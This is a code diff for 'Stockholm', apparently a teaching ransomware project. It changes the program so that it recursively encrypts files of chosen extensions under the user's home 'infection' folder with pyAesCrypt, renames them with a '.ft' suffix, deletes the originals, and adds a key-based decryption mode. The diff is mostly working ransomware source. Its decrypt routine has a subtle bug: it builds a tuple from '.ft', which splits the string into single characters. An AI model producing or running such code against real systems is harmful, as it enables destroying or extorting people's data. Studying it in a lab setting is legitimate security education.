@@ -1,18 +1,20 @@
 import argparse
 import os
-from cryptography.fernet import Fernet
+import pyAesCrypt
+import secrets
 
 program_version = 'Version 1.0'
 supported_extensions_path = "./supported_extensions"
-# infection_path = f"{os.getenv('HOME')}/infection/"
-infection_path = "./infection/"
+infection_path = f"{os.getenv('HOME')}/infection/"
 extensions = ".ft"
 key_file_path = "./encryption_key.key"
+buffer_size = 64 * 1024
 
 class Stockholm:
     isSilent = False
     supported_extensions = []
-    fernet_instance = None
+    key = None
+    folders_path = []
 
     def __init__(self, args):
         if (args.silent == True):
@@ -25,27 +27,59 @@ class Stockholm:
             print("Extensions file not found!")
             exit(1);
     
+    def decrypt(self):
+        try:
+            for folder in self.folders_path:
+                for file in os.listdir(folder):
+                    file_path = os.path.join(folder, file)
+                    if (not file_path.endswith(tuple(".ft"))):
+                        continue ;
+                    if (not self.isSilent):
+                        print("Decrypting,", file_path)
+                    pyAesCrypt.decryptFile(file_path, file_path[:-3], self.key, buffer_size)
+                    os.remove(file_path)
+        except:
+            print("Incorrect key")
 
-    def reverse_infection(self):
-        file = open(key_file_path, 'r');
-        key = file.read();
-        self.fernet = Fernet(key);
+    def reverse_infection(self, key):
+        self.key = key
+        self.find_folder_path()
+        self.decrypt()
         return ;
     
     def generate_key(self):
-        file = open(key_file_path, 'a+b');
+        file = open(key_file_path, 'a+');
         file.seek(0)
         old_key = file.read();
         file.seek(0)
-        if (old_key.decode() == ""):
-            key = Fernet.generate_key()
+        if (old_key == ""):
+            key = secrets.token_hex(16)
             file.write(key)
             return key
         return old_key
+    
+    def find_folder_path(self):
+        self.folders_path.append(os.path.join(infection_path))
+        for root, dirs, files in os.walk(os.path.expanduser(infection_path)):
+            for dir in dirs:
+                self.folders_path.append(os.path.join(root, dir))
+
+    def encrypt(self):
+        for folder in self.folders_path:
+            for file in os.listdir(folder):
+                file_path = os.path.join(folder, file)
+                if (not file_path.endswith(tuple(self.supported_extensions))):
+                    continue ;
+                if (not self.isSilent):
+                    print("Encrypting,", file_path)
+                pyAesCrypt.encryptFile(file_path, file_path + ".ft", self.key, buffer_size)
+                os.remove(file_path)
+
 
     def infect(self):
-        key = self.generate_key()
-        self.fernet = Fernet(key)
+        self.key = self.generate_key()
+        self.find_folder_path()
+        self.encrypt()
         return ;
 
 
@@ -69,7 +103,7 @@ def exec():
     
     stockholm = Stockholm(args);
     if (args.reverse):
-        stockholm.reverse_infection()
+        stockholm.reverse_infection(args.reverse)
     else:
         stockholm.infect()
         
